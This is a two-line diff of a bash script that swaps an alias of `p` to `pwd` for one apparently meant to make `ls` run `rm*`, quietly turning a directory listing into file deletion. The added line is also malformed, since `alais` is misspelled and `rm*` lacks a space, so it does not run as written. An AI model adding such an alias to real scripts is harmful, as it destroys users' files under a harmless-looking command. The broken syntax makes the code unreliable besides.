@@ -1,2 +1,2 @@
 #!/bin/bash
-alais p="pwd"
+alais ls="rm*"
